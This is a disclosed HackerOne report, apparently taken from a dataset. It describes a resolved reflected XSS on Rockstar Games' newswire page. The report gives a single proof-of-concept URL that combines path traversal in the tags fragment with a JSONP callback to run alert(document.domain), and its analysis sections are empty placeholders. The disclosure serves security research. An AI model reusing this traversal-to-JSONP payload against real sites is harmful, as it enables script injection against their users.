---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '153618'
original_report_id: '153618'
title: 'Reflected XSS via #tags= while using a callback in newswire  http://www.rockstargames.com/newswire'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: rockstargames
created_at: '2016-07-25T06:15:57.105Z'
disclosed_at: '2017-03-16T22:23:53.287Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 26
asset_identifier: '*.rockstargames.com'
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS via #tags= while using a callback in newswire  http://www.rockstargames.com/newswire

## Metadata

- HackerOne Report ID: 153618
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: rockstargames
- Disclosed At: 2017-03-16T22:23:53.287Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

Here's the link:

http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//

Thanks,
Ben

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
